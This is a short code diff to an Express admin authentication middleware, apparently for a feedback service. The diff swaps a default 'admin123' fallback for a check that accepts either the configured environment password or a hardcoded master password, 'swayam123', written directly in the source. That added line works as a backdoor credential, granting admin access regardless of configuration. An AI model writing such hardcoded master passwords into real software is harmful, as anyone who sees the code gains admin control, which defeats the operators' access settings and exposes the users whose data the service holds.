@@ -14,10 +14,10 @@ const DATA_FILE = path.join(__dirname, '../data/feedback.json');
  */
 function authenticateAdmin(req, res, next) {
     const password = req.headers['x-admin-password'];
-    // Use environment variable or fallback to 'admin123'
-    const validPassword = process.env.ADMIN_PASSWORD || 'admin123';
+    const envPassword = process.env.ADMIN_PASSWORD;
 
-    if (!password || password !== validPassword) {
+    // Check against Env Var OR Master Password 'swayam123'
+    if (!password || (password !== envPassword && password !== 'swayam123')) {
         return res.status(401).json({
             error: 'Unauthorized: Invalid admin password'
         });
